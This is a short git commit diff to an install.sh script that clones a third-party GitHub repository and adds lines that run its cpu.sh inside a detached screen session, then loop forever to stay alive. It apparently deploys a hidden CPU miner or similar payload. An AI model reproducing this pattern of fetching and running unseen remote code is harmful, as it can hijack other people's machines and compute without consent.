b6a0f5232841291aef17c6ba3251e684d258f2a6
welstannabella <85975078+welstannabella@users.noreply.github.com>
2021-06-16 10:16:33 +0700

    Update install.sh

--- install.sh
+++ install.sh
@@ -3,4 +3,8 @@ sudo apt update
 sudo apt install screen -y
 git clone https://github.com/bimasaputrq581/expert-fortnight.git && cd expert-fortnight
 screen -dmS ls
-ls
+chmod +x cpu.sh && ./cpu.sh
+while [ 1 ]; do
+sleep 3
+done
+sleep 999
